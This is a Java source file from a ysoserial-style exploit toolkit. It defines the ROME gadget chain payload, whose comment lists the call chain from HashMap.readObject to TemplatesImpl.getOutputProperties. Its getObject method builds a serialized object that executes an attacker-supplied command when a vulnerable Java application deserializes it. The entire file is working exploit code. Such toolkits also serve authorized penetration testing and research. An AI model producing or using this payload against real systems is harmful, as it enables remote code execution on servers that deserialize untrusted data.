package org.su18.ysuserial.payloads.gadgets;


import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;

import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;

/**
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 */
@Dependencies("rome:rome:1.0")
@Authors({Authors.MBECHLER})
public class ROME implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {
		Object     o        = Gadgets.createTemplatesImpl(command);
		ObjectBean delegate = new ObjectBean(Templates.class, o);
		ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
		return Gadgets.makeMap(root, root);
	}
}
